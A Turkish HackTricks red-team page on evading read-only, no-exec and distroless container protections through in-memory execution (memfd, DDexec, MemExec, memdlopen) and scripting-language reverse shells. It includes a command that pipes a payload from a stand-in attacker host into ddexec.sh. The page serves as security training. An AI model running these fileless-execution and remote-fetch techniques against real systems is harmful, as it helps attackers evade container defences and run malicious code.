# FS Korumalarını Atlatma: Salt Okunur / İcra Edilemez / Distroless

<details>

<summary><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong> ile sıfırdan kahramana kadar AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)'ı **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>

## Videolar

Aşağıdaki videolarda bu sayfada bahsedilen teknikleri daha detaylı bir şekilde bulabilirsiniz:

* [**DEF CON 31 - Gizlilik ve Kaçınma için Linux Bellek Manipülasyonu**](https://www.youtube.com/watch?v=poHirez8jk4)
* [**DDexec-ng ve bellek içi dlopen() ile Gizli Sızıntılar - HackTricks Takip 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)

## Salt okunur / icra edilemez senaryo

Özellikle konteynerlerde, linux makinelerinin **salt okunur (ro) dosya sistemi korumasıyla** karşılaşmak giderek daha yaygın hale gelmektedir. Bunun sebebi, salt okunur dosya sistemiyle bir konteyner çalıştırmak, `securitycontext` içinde **`readOnlyRootFilesystem: true`** olarak ayarlanması kadar kolaydır:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Ancak, dosya sistemi salt okunur olarak bağlansa bile, **`/dev/shm`** hala yazılabilir olacaktır, bu yüzden diske bir şey yazamayacağımızı düşünmek yanıltıcı olur. Ancak, bu klasör **icra edilemez koruma** ile bağlanacaktır, bu nedenle buraya bir ikili indirirseniz, **onu icra edemezsiniz**.

{% hint style="warning" %}
Kırmızı takım bakış açısından, bu, sistemde zaten olmayan (arka kapılar veya `kubectl` gibi sayıcılar gibi) ikili dosyaları indirip icra etmeyi **zorlaştırır**.
{% endhint %}

## En Kolay Atlatma: Betikler

İkili dosyaları bahsettim, **yorumlayıcısı makinede bulunan herhangi bir betiği** (örneğin `sh` varsa bir **kabuk betiği** veya `python` yüklüyse bir **python betiği**) icra edebilirsiniz.

Ancak, bu, ikili arka kapınızı veya çalıştırmanız gereken diğer ikili araçları icra etmek için yeterli değildir.

## Bellek Atlatmaları

Eğer bir ikili dosyayı icra etmek istiyorsanız, ancak dosya sistemi buna izin vermiyorsa, bunu yapmanın en iyi yolu, **bellekten icra etmektir**, çünkü **korumalar burada uygulanmaz**.

### FD + exec sistem çağrısı atlatması

Eğer makinede **Python**, **Perl** veya **Ruby** gibi güçlü betik motorları varsa, ikili dosyayı bellekten icra etmek için indirebilir, onu bellekte bir bellek dosya tanımlayıcısına (`create_memfd` sistem çağrısı) kaydedebilirsiniz. Bu, korumalar tarafından korunmayacak ve ardından **`exec` sistem çağrısını** kullanarak **fd'yi icra edilecek dosya olarak** belirtebilirsiniz.

Bunun için [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) projesini kolayca kullanabilirsiniz. Ona bir ikili dosya geçirebilir ve **ikili dosyayı sıkıştırılmış ve b64 kodlanmış** bir şekilde içeren belirtilen dilde bir betik oluşturur. Bu betik, `create_memfd` sistem çağrısını çağırarak oluşturulan bir **fd** ile ikili dosyayı **çözümlemek ve sıkıştırmak** için talimatları içerir ve onu çalıştırmak için bir **exec** sistem çağrısı yapar.

{% hint style="warning" %}
Bu, PHP veya Node gibi diğer betik dillerinde çalışmaz çünkü bunların bir betikten **ham sistem çağrıları çağırmak için varsayılan bir yolu yoktur**, bu nedenle `create_memfd`'yi çağırmak için **bellek fd** oluşturmak mümkün değildir.

Ayrıca, `/dev/shm` içinde bir dosya ile **düzenli bir fd** oluşturmak çalışmayacaktır, çünkü **icra edilemez koruma** uygulanacaktır.
{% endhint %}

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec), kendi işleminizin **`/proc/self/mem`**'ini üzerine yazarak **bellekteki kendi işleminizin belleğini değiştirmenizi** sağlayan bir tekniktir.

Bu nedenle, işlem tarafından icra edilen derleme kodunu kontrol ederek, bir **shellcode** yazabilir ve işlemi **herhangi bir keyfi kodu icra etmek için değiştirebilirsiniz**.

{% hint style="success" %}
**DDexec / EverythingExec**, kendi **shellcode**'unuzu veya **bellekten herhangi bir ikili**'yi **yüklemenize ve icra etmenize** olanak sağlar.
{% endhint %}
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Bu teknik hakkında daha fazla bilgi için Github'u kontrol edin veya:

{% content-ref url="ddexec.md" %}
[ddexec.md](ddexec.md)
{% endcontent-ref %}

### MemExec

[**Memexec**](https://github.com/arget13/memexec), DDexec'in doğal bir sonraki adımıdır. Bu, **DDexec kabuk kodunu daemonize eder**, bu nedenle farklı bir ikili dosyayı çalıştırmak istediğiniz her seferinde DDexec'i yeniden başlatmanıza gerek kalmaz, sadece DDexec tekniği aracılığıyla memexec kabuk kodunu çalıştırabilir ve ardından **bu daemonla iletişim kurarak yüklemek ve çalıştırmak için yeni ikili dosyaları geçirebilirsiniz**.

[https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php) adresinde **memexec'i PHP ters kabuktan ikili dosyaları çalıştırmak için nasıl kullanacağınıza dair bir örnek** bulabilirsiniz.

### Memdlopen

DDexec ile benzer bir amaçla, [**memdlopen**](https://github.com/arget13/memdlopen) tekniği, daha sonra bunları yürütmek için bellekte ikili dosyaları yüklemenin daha kolay bir yolunu sağlar. Bağımlılıkları olan ikili dosyaları bile yüklemek mümkün olabilir.

## Distroless Bypass

### Distroless nedir

Distroless konteynerler, paket yöneticisi, kabuk veya sistem araçları gibi daha büyük bileşenleri hariç tutarak, yalnızca belirli bir uygulama veya hizmeti çalıştırmak için gereken **en temel bileşenleri** içerir.

Distroless konteynerlerin amacı, gereksiz bileşenleri ortadan kaldırarak konteynerlerin **saldırı yüzeyini azaltmak** ve sömürülebilecek güvenlik açıklarının sayısını en aza indirmektir.

### Ters Kabuk

Distroless konteynerde, düzenli bir kabuk elde etmek için **`sh` veya `bash`** bile bulamayabilirsiniz. Ayrıca, genellikle bir sistemde çalıştırdığınız `ls`, `whoami`, `id` gibi ikili dosyaları da bulamazsınız.

{% hint style="warning" %}
Bu nedenle, genellikle sistemde yaptığınız gibi bir **ters kabuk alamazsınız** veya sistemde **numaralandırma** yapamazsınız.
{% endhint %}

Ancak, etkilenen konteyner örneğin bir flask web çalıştırıyorsa, python yüklüdür ve bu nedenle bir **Python ters kabuk** alabilirsiniz. Node çalıştırıyorsa, bir Node ters kabuk alabilirsiniz ve aynı şey hemen hemen her **betik dili** için geçerlidir.

{% hint style="success" %}
Betik dili kullanarak, dilin yeteneklerini kullanarak sistemde **numaralandırma yapabilirsiniz**.
{% endhint %}

**`read-only/no-exec`** korumaları yoksa, ters kabuğunuzu kullanarak **ikili dosyalarınızı dosya sistemine yazabilir** ve **çalıştırabilirsiniz**.

{% hint style="success" %}
Ancak, bu tür konteynerlerde genellikle bu korumalar bulunur, ancak **önceki bellek yürütme tekniklerini atlatmak için** kullanabilirsiniz.
{% endhint %}

[**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE) adresinde, bazı RCE güvenlik açıklarını **sömürmek için örnekler** ve bellekten ikili dosyaları çalıştırmak için **ters kabuklar** nasıl alınacağına dair örnekler bulabilirsiniz.

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman olmak için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>'ı öğrenin!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **tanıtmak veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)'ı **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek paylaşın**.

</details>
